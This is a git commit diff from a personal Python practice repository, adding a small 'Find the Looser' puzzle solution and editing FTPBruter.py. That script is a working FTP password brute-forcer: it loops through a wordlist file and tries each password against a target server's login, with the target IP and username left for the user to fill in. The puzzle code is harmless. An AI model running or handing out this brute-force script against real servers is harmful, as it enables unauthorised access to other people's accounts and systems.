e05d2e7f1b17f3b6f42bf421001b5fbf60973fde
Yash Parwal <yashparwal1@gmail.com>
2023-05-23 00:55:29 +0530

    new

--- python/allinone.py
+++ python/allinone.py
@@ -25,5 +25,34 @@
 
 # numb()
 
-for i in range(5,0,-1):
-    print("*"*i)
+# ==================================================================================
+# QUESTION: Find the Looser - GfG
+
+win = []
+lose = []
+n = 5
+k = 2
+steps = k
+i = 1
+for f in range(1,n+1): # 1,2,3
+    if i >= n: # 7>5, 8>5
+        i=(i-n)
+        if i in win:
+            for l in range(1,n+1):
+                if l not in win:
+                    lose.append(l)
+            break
+    ball = i # 1,3,2
+    win.append(ball)
+    k = steps*f  # 2,4,6
+    i = i+k  # 3,7,8
+
+# print(win)
+print(lose)
+
+# ball = 1
+# ball = ball+k
+# ball = ball+(k*2)
+
+# ==================================================================================
+
--- python/pythonprojects/FTPBruter.py
+++ python/pythonprojects/FTPBruter.py
@@ -3,13 +3,13 @@ import ftplib, pyfiglet
 banner = pyfiglet.figlet_format("FTP   Bruter")
 print(banner, end="")
 print("|"+"_"*19 + "@Yashparwal1" + "_"*19+"|")
-# print("\n")
+print("\n")
 
 def check(user,password):
     try:
         print(f"\nTrying {user}:{password} ...")
         ftp=ftplib.FTP()
-        if ftp.connect("192.168.29.21",21):
+        if ftp.connect("TARGET_IP_ADDRESS",21): #put your Target IP Address here
             ftp.login(user,password)
             print(f"Successlly Logged in: {user}:{password}")
         ftp.quit()
@@ -17,8 +17,8 @@ def check(user,password):
     except:
         return False
     
-user = 'keton'
-passlist = open('pass.txt','r')
+user = input('Enter the username: ')
+passlist = open('pass.txt','r') #modify according to your wordlist
 for password in passlist:
     if check(user,password.rstrip()) == True:
         break
